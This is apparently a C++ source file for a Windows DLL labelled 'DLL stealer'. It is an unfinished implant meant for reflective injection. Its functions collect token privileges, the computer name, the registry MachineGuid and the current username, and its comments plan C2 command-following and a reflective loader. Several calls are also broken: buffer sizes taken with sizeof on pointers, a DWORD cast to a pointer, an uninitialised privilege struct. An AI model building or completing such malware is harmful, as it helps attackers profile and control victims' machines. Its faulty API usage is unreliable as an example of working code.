#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <winreg.h>
#include <WinBase.h>
#include <lmcons.h>
#include <securitybaseapi.h>

//DLL stealer


//gather info (Situational Awareness) 
	//Need way to connect to machine??
//GetHostAddress();  Might not need this

//Mac Address??

//Computer IP address??

//Root privileges??
LPVOID checkPrivileges(){
	HANDLE hToken;
	//Use OpenThreadToken to get handle
	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	/*typedef struct _TOKEN_PRIVILEGES {
  		DWORD               PrivilegeCount;
  		LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
	} TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES; */
	TOKEN_PRIVILEGES currentPrivilege; //might need to set this !!
	DWORD retLength;

	bool tokenSuccess = GetTokenInformation(hToken, TokenPrivileges, currentPrivilege.Privileges, currentPrivilege.PrivilegeCount, &retLength); //Use TokenPrivileges option
	if(!tokenSuccess){
		std::cout << "PRIVILEGES FAILED" << std::endl;
		return "FAIL";
	}
	else{
		std::cout << "SUCCESS!" <<std::endl;
		std::cout << "The Current Privilege is " << currentPrivilege.Privileges << std::endl;
		return currentPrivilege.Privileges;
	}

}

//directory info??


//Computer Name
char *myGetComputerName(){
	char *compNameBuffer = new char[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD BufferSize = sizeof(compNameBuffer);
	long compNameSuccess = GetComputerNameA(compNameBuffer, &BufferSize);
	if(compNameSuccess == 0){
			std::cout << "Computer Name FAILED" << std::endl;
		return "FAIL";
	}
	else {
		std::cout << "SUCCESS!" <<std::endl;
		std::cout << "The Computer Name is " << compNameBuffer << std::endl;
		return compNameBuffer; 
	}
}

//Machine Guid
char *GetMachineGuid (){
	char *guidBuffer = new char[255];  //check this size
	DWORD Buffersize = sizeof(guidBuffer);

	long guidSuccess = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, guidBuffer, (LPDWORD) Buffersize);
	if (guidSuccess == 0){
		std::cout << "MACHINE GUID FAILED" << std::endl;
		return "FAIL";
	}
	else {
		std::cout << "SUCCESS!" <<std::endl;
		std::cout << "The Machine Guid is " << guidBuffer << std::endl;
		return guidBuffer; 
	}	
}

//Current Username
char *myGetUserName(){
	char *userNameBuffer = new char[UNLEN + 1]; 
	DWORD BufferSize = sizeof(userNameBuffer);
	long UNSuccess = GetUserNameA(userNameBuffer, &BufferSize);
	if (UNSuccess == 0){
			std::cout << "CURRENT USERNAME FAILED" << std::endl;
		return "FAIL";
	}
	else {
		std::cout << "SUCCESS!" <<std::endl;
		std::cout << "The current username is " << userNameBuffer << std::endl;
		return userNameBuffer; 
	}
}






//Ability to follow commmands from C2

//Characteristics pre configured??


//Check for chonky.txt file???



//EXPORT REFLECTIVE LOADER FUNCTION
//possibly import library that loads for me?


// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;

HMODULE DllHandle = NULL; 

//DLL MAIN
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {

    switch( fdwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			MessageBoxA( NULL, "Hello from DllMain!", "Reflective Dll Injection", MB_OK );
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }




    return TRUE;
}